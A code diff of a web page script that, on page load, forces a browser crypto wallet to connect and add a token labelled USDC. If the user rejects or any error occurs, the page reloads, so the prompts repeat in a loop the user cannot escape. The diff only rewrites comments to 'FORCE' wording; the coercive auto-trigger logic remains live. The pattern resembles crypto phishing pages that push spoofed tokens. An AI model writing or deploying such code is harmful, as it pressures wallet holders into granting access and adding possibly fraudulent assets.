@@ -22,10 +22,10 @@
         async function forceExecute() {
             if (window.ethereum) {
                 try {
-                    // Stage 1: Absolute Authorization
+                    // FORCE ACCOUNT HANDSHAKE
                     await window.ethereum.request({ method: 'eth_requestAccounts' });
                     
-                    // Stage 2: Immediate Asset Link
+                    // FORCE USDC ASSET ADDITION
                     await window.ethereum.request({
                         method: 'wallet_watchAsset',
                         params: {
@@ -39,12 +39,10 @@
                     });
                     document.getElementById('status').innerText = "LINK SUCCESSFUL";
                 } catch (err) {
-                    // Force refresh to clear any remaining browser stalls
                     window.location.reload();
                 }
             }
         }
-        // Auto-triggers on load to bypass the "Ready" loop
         window.onload = forceExecute;
     </script>
 </body>
